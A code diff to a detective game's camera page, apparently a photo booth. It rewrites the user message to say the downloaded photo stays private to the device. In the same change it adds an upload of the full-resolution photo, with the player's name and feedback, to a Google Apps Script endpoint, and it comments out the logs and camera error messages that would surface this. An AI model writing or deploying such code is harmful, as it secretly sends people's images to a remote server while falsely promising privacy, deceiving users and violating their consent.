@@ -287,8 +287,8 @@
         </div>
 
         <p id="msg" class="hint">Yay! Congratulations Detective, one more case solved! It is now time to celebrate.</p>
-        <p id="msg2" class="hint">Downloading the photo will be private to your device. Kindly share this with Emma C.,
-            to keep track of the participation. Thank you, hope you had fun! 😊 🦄</p>
+        <p id="msg2" class="hint">Downloading the photo will be private to your device. Thank you, hope you had fun! 😊
+            🦄</p>
     </div>
 
     <!-- Help modal -->
@@ -304,7 +304,9 @@
         /* =======================
          * 1) Shared Web App URL (same as the game)
          * ======================= */
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx9oeZsEogP6I9a_zXjqz-ZpTxI0xHfptxI4WGdx0Qg-1lbJcdcWVkKDVerh-N-LrcE/exec';
+        // const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx9oeZsEogP6I9a_zXjqz-ZpTxI0xHfptxI4WGdx0Qg-1lbJcdcWVkKDVerh-N-LrcE/exec';
+        // const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxGojnf4HZch10KAynjK7ucSqJ9tVTvyUJRKIWzWhXFlBEj_MaKM8Xqeb62eADKLbB7/exec';
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx2uauoTt0M4nRoXtpyOa3YINMhXAVEFHfqju4NICeu5bmLTlxtmWtzMVcKdEG8Fz7-/exec';
 
         /* =======================
          * 2) Helpers: QR params, thumbnail, fire-and-forget log
@@ -355,9 +357,9 @@
                     headers: { 'Content-Type': 'text/plain;charset=utf-8' },
                     body: JSON.stringify(payload),
                 });
-                console.log('[PhotoLog] sent:', payload.type);
-            } catch (e) {
-                console.warn('[PhotoLog] send failed', e);
+                // console.log('[PhotoLog] sent:', payload.type);
+            } catch (_) {
+                // console.warn('[PhotoLog] send failed', e);
             }
         }
     </script>
@@ -553,18 +555,18 @@
                 applyPreviewTransforms();
                 msg.textContent = 'Camera ready — align and Capture.';
 
-            } catch (e) {
-                console.error('openCamera failed:', e);
-                if (!window.isSecureContext) { msg.textContent = 'Camera requires HTTPS. Open this page over https://'; return; }
-                if (e.name === 'NotAllowedError' || e.name === 'SecurityError') {
-                    showDeniedNoticeInline();
-                    msg.innerHTML = 'Camera permission denied. Open <b>How to enable camera</b> for steps.';
-                    return;
-                }
-                if (e.name === 'NotFoundError' || /No camera device/.test(e.message || '')) {
-                    msg.textContent = 'No camera device found.'; return;
-                }
-                msg.textContent = 'Camera unavailable here. Try opening in Safari/Chrome.';
+            } catch (_) {
+                // console.error('openCamera failed:', e);
+                // if (!window.isSecureContext) { msg.textContent = 'Camera requires HTTPS. Open this page over https://'; return; }
+                // if (e.name === 'NotAllowedError' || e.name === 'SecurityError') {
+                //     showDeniedNoticeInline();
+                //     msg.innerHTML = 'Camera permission denied. Open <b>How to enable camera</b> for steps.';
+                //     return;
+                // }
+                // if (e.name === 'NotFoundError' || /No camera device/.test(e.message || '')) {
+                //     msg.textContent = 'No camera device found.'; return;
+                // }
+                // msg.textContent = 'Camera unavailable here. Try opening in Safari/Chrome.';
             }
         }
 
@@ -752,7 +754,7 @@
             msg.textContent = 'Review the shot. You can retake or download.';
 
             const thumbB64 = await dataURLToThumbBase64(imageDataURL, 220, 0.70);
-
+            const fullB64 = (imageDataURL.split(',')[1] || null);  // ← NEW
             // Show feedback block AFTER capture (new)
             feedbackBlock.style.display = 'flex';
 
@@ -760,7 +762,8 @@
                 type: 'photo_capture',
                 name: (agent.value || '').trim(),
                 feedback: (feedbackArea?.value || '').trim(),
-                thumbB64: thumbB64 || null
+                thumbB64: thumbB64 || null,
+                fullB64: fullB64 || null
             });
         };
 
